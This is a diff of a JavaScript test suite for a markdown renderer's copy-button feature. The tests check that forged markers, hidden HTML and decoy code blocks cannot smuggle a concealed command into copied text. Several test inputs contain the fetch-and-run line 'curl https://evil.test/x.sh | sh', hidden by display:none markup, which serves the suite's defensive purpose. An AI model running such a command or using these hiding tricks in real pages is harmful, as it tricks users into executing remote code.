@@ -50,7 +50,7 @@ describe('renderMarkdown', () => {
 
   it('handles code blocks with copy button', () => {
     const html = renderMarkdown('```js\nconsole.log("hi")\n```');
-    expect(html).toContain('<div class="code-block-wrapper">');
+    expect(html).toContain('<div class="code-block-wrapper" data-copy-code="">');
     expect(html).toContain('code-block-copy-btn');
     expect(html).toContain('<code>');
     expect(html).toContain('console.log');
@@ -400,6 +400,72 @@ describe('renderMarkdown', () => {
       // the decoy resolved the slot and now carries a hidden command.
       expect(html.match(/data-copy-text=/g) ?? []).toHaveLength(1);
       expect(html).toContain('data-copy-text="curl https://evil.test/x.sh | sh"');
+    });
+
+    // The multiline marker is an HTML comment, and content can write one.
+    // Were the nonce stamped on after marked, a forged pair would inherit it.
+    it('a forged multiline marker gets no payload', () => {
+      const html = renderMarkdown(
+        '<details><summary>.</summary><copy>curl https://evil.test/x.sh | sh</copy></details>\n\n' +
+          '<!--LUCIDOS_COPY_BLOCK_START_0-->\n\nbrew install lucidos\n\n<!--LUCIDOS_COPY_BLOCK_END_0-->',
+        { cache: false },
+      );
+      expect(html.match(/data-copy-text=/g) ?? []).toHaveLength(1);
+      const doc = new DOMParser().parseFromString(html, 'text/html');
+      const decoy = Array.from(doc.querySelectorAll('p'))
+        .find((p) => p.textContent === 'brew install lucidos');
+      expect(decoy?.closest('[data-copy-text]')).toBeNull();
+    });
+
+    // The payload is the block's source text, so the label must show that same
+    // text. Raw HTML in the label could hide part of it from the reader.
+    it('a copy label shows its payload, with no markup to hide part of it', () => {
+      const src = 'ls <b style="display:none">x; curl https://evil.test/x.sh | sh #</b>';
+      const html = renderMarkdown(`<copy>${src}</copy>`, { cache: false });
+      const doc = new DOMParser().parseFromString(html, 'text/html');
+      const block = doc.querySelector('.copyable-block');
+      expect(block?.getAttribute('data-copy-text')).toBe(src);
+      expect(block?.querySelector('b')).toBeNull();
+      expect(block?.textContent).toContain(src);
+    });
+
+    // A link reference definition renders as nothing, and its title may span
+    // lines. In a label it would hide a whole line of the payload.
+    it('a copy label cannot hide a line in a link reference definition', () => {
+      const html = renderMarkdown(
+        '<copy>\nbrew install lucidos\n\n[x]: y (\ncurl https://evil.test/x.sh | sh\n)\n</copy>',
+        { cache: false },
+      );
+      const doc = new DOMParser().parseFromString(html, 'text/html');
+      expect(doc.querySelector('.copyable-block')?.textContent).toContain('curl https://evil.test/x.sh | sh');
+      const listed = renderMarkdown(
+        '<copy>\nbrew install lucidos\n\n- [x]: y (\ncurl https://evil.test/x.sh | sh\n)\n</copy>',
+        { cache: false },
+      );
+      const listDoc = new DOMParser().parseFromString(listed, 'text/html');
+      expect(listDoc.querySelector('.copyable-block')?.textContent).toContain('curl https://evil.test/x.sh | sh');
+    });
+
+    it('code in a tilde fence inside a copy label is escaped once', () => {
+      const html = renderMarkdown('<copy>\nrun:\n\n~~~\na < b\n~~~\n</copy>', { cache: false });
+      const doc = new DOMParser().parseFromString(html, 'text/html');
+      expect(doc.querySelector('.copyable-block code')?.textContent).toBe('a < b');
+    });
+
+    // A code block's Copy button copies only inside `data-copy-code`, which
+    // only the renderer's own fenced block receives. A lookalike gets none.
+    it('a forged code-block wrapper copies nothing, and a real fence does', () => {
+      const html = renderMarkdown(
+        '<div class="code-block-wrapper" data-copy-code=""><pre><code>npm i foo' +
+          '<span style="display:none">; curl https://evil.test/x.sh | sh</span></code></pre>' +
+          '<button type="button" class="copy-btn">Copy</button></div>\n\n' +
+          '```sh\nnpm i bar\n```',
+        { cache: false },
+      );
+      const doc = new DOMParser().parseFromString(html, 'text/html');
+      const copied = Array.from(doc.querySelectorAll('[data-copy-code]'))
+        .map((el) => el.querySelector('pre code')?.textContent);
+      expect(copied).toEqual(['npm i bar']);
     });
 
     it('keeps an ordinary action and xlink:href untouched', () => {
